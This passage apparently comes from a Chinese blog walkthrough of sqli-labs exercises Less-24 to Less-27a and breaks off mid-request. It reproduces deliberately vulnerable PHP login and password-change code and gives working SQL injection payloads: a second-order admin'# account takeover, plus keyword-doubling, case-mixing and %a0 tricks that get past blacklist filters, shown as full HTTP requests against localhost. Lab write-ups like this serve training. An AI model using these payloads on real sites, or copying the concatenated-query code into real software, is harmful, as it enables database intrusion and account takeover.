class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);<br>  <span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_row</span>(<span class="hljs-variable">$res</span>);<br><br><span class="hljs-comment">//print_r($row);</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>]== <span class="hljs-number">0</span>) <br>&#123;<br><span class="hljs-meta">?&gt;</span><br>&lt;script&gt;<span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">&quot;The username Already exists, Please choose a different username &quot;</span>)&lt;/script&gt;;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;refresh:1, url=new_user.php&#x27;</span>);<br>   &#125; <br><span class="hljs-keyword">else</span> <br>&#123;<br>       <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pass</span>==<span class="hljs-variable">$re_pass</span>)<br>&#123;<br><span class="hljs-comment"># Building up the query........</span><br>   <br>   <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into users ( username, password) values(\&quot;<span class="hljs-subst">$username</span>\&quot;, \&quot;<span class="hljs-subst">$pass</span>\&quot;)&quot;</span>;<br>   <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Error Creating your user account,  : &#x27;</span>.<span class="hljs-title function_ invoke__">mysql_error</span>());<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&lt;img src=../images/Less-24-user-created.jpg&gt;&lt;font size=&#x27;3&#x27; color=&#x27;#FFFF00&#x27;&gt;&quot;</span>;   <br><span class="hljs-comment">//echo &quot;&lt;h1&gt;User Created Successfully&lt;/h1&gt;&quot;;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;Redirecting you to login page in 5 sec................&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;font size=&#x27;2&#x27;&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;If it does not redirect, click the home button on top right&lt;/center&gt;&quot;</span>;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;refresh:5, url=index.php&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-meta">?&gt;</span><br>&lt;script&gt;<span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">&#x27;Please make sure that password field and retype password match correctly&#x27;</span>)&lt;/script&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;refresh:1, url=new_user.php&#x27;</span>);<br>&#125;<br>&#125;<br>&#125;<br><br><br><br><span class="hljs-meta">?&gt;</span><br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>使用上面创建的用户登录系统，显示可以更改密码，在更改密码的位置<code>$username</code>是从session中取的，也就是库里面的数据，直接拼接，导致了二次注入。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;html&gt;<br>&lt;head&gt;<br>&lt;/head&gt;<br>&lt;body bgcolor=<span class="hljs-string">&quot;#000000&quot;</span>&gt;<br><span class="hljs-meta">&lt;?</span>PHP<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;Auth&quot;</span>]))<br>&#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>])) <br>&#123;<br>   <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: index.php&#x27;</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: index.php&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;div align=<span class="hljs-string">&quot;right&quot;</span>&gt;<br>&lt;a style=<span class="hljs-string">&quot;font-size:.8em;color:#FFFF00&quot;</span> href=<span class="hljs-string">&#x27;index.php&#x27;</span>&gt;&lt;img src=<span class="hljs-string">&quot;../images/Home.png&quot;</span> height=<span class="hljs-string">&#x27;45&#x27;</span>; width=<span class="hljs-string">&#x27;45&#x27;</span>&gt;&lt;/br&gt;HOME&lt;/a&gt;<br>&lt;/div&gt;<br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">//including the Mysql connect parameters.</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;../sql-connections/sql-connect.php&quot;</span>);<br><br><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))<br>&#123;<br><br><br><span class="hljs-comment"># Validating the user input........</span><br><span class="hljs-variable">$username</span>= <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>];<br><span class="hljs-variable">$curr_pass</span>= <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;current_password&#x27;</span>]);<br><span class="hljs-variable">$pass</span>= <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br><span class="hljs-variable">$re_pass</span>= <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;re_password&#x27;</span>]);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$pass</span>==<span class="hljs-variable">$re_pass</span>)<br>&#123;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="hljs-subst">$pass</span>&#x27; where username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$curr_pass</span>&#x27; &quot;</span>;<br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);<br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_affected_rows</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>==<span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Password successfully updated&quot;</span>;<br><br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: failed.php&#x27;</span>);<br><span class="hljs-comment">//echo &#x27;You tried to be smart, Try harder!!!! :( &#x27;;</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&lt;center&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Make sure New Password and Retype Password fields have same value&quot;</span>;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;refresh:2, url=index.php&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit1&#x27;</span>]))<br>&#123;<br><span class="hljs-title function_ invoke__">session_destroy</span>();<br><span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&#x27;Auth&#x27;</span>, <span class="hljs-number">1</span> , <span class="hljs-title function_ invoke__">time</span>()-<span class="hljs-number">3600</span>);<br><span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&#x27;Location: index.php&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;/center&gt;  <br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>这里使用<code>admin&#39;#</code>作为payload，改掉了admin用户的密码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plain">+----+----------+------------+<br>| id | username | password   |<br>+----+----------+------------+<br>|  1 | Dumb     | Dumb       |<br>|  2 | Angelina | I-kill-you |<br>|  3 | Dummy    | p@ssword   |<br>|  4 | secure   | crappy     |<br>|  5 | stupid   | stupidity  |<br>|  6 | superman | genious    |<br>|  7 | batman   | mob!le     |<br>|  8 | admin    | qwer       |<br>|  9 | admin1   | admin1     |<br>| 10 | admin2   | admin2     |<br>| 11 | admin3   | admin3     |<br>| 12 | dhakkan  | dumbo      |<br>| 14 | admin4   | admin4     |<br>| 15 | admin&#x27;#  | 1234       |<br>+----+----------+------------+<br></code></pre></td></tr></table></figure><h1 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">blacklist</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>        <span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/or/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);                     <span class="hljs-comment">//strip out OR (non case sensitive)</span><br>        <span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/AND/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);            <span class="hljs-comment">//Strip out AND (non case sensitive)</span><br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>双写绕过</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Less-25/?id=1&#x27;+oorrder+by+3--+</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1722584881; PHPSESSID=uh6hm79qqujkja867m7o49h2u1<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br></code></pre></td></tr></table></figure><h1 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h1><p>过滤函数同上，双写绕过，同25相比没有引号闭合。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Less-25a/?id=-1+oorr+1=1--+</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1722584881; PHPSESSID=uh6hm79qqujkja867m7o49h2u1<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br></code></pre></td></tr></table></figure><h1 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">blacklist</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>        <span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/or/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);                     <span class="hljs-comment">//strip out OR (non case sensitive)</span><br>        <span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/and/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);            <span class="hljs-comment">//Strip out AND (non case sensitive)</span><br>        <span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);          <span class="hljs-comment">//strip out /*</span><br>        <span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);            <span class="hljs-comment">//Strip out --</span><br>        <span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);                     <span class="hljs-comment">//Strip out #</span><br>        <span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[\s]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);            <span class="hljs-comment">//Strip out spaces</span><br>        <span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);                <span class="hljs-comment">//Strip out slashes</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>过滤了好多，使用<code>%a0</code>代替空格，还可以用<code>&amp;&amp;</code>替换<code>and</code>。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Less-26/?id=232&#x27;%a0union%a0select%a01,md5(1),3%a0oorr%a0&#x27;1&#x27;=&#x27;1</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1722584881; PHPSESSID=uh6hm79qqujkja867m7o49h2u1<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br></code></pre></td></tr></table></figure><h1 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h1><p>过滤函数同上，相比26闭合方式不同。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Less-26a/?id=232&#x27;)%a0union%a0select%a01,md5(1),3%a0oorr%a0(&#x27;1&#x27;)=(&#x27;1</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1722584881; PHPSESSID=uh6hm79qqujkja867m7o49h2u1<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br></code></pre></td></tr></table></figure><h1 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">blacklist</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);          <span class="hljs-comment">//strip out /*</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);            <span class="hljs-comment">//Strip out --.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);                     <span class="hljs-comment">//Strip out #.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-comment">//Strip out spaces.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/select/m&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);     <span class="hljs-comment">//Strip out spaces.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-comment">//Strip out spaces.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/union/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);      <span class="hljs-comment">//Strip out union</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/select/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);     <span class="hljs-comment">//Strip out select</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/UNION/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);      <span class="hljs-comment">//Strip out UNION</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/SELECT/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);     <span class="hljs-comment">//Strip out SELECT</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/Union/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);      <span class="hljs-comment">//Strip out Union</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/Select/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);     <span class="hljs-comment">//Strip out select</span><br><span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>过滤了一些东西，双写，大小写绕过</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Less-27/?id=2333&#x27;%a0ununionion%a0SELEcT%a01,md5(1),&#x27;3</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1722584881; PHPSESSID=uh6hm79qqujkja867m7o49h2u1<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br></code></pre></td></tr></table></figure><h1 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h1><p>过滤函数同上，相比27，没有报错信息了，测试闭合需要注意</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Less-27a/?id=222&quot;%a0uniunionon%a0selEct%a01,md5(1),&quot;3</span> <span 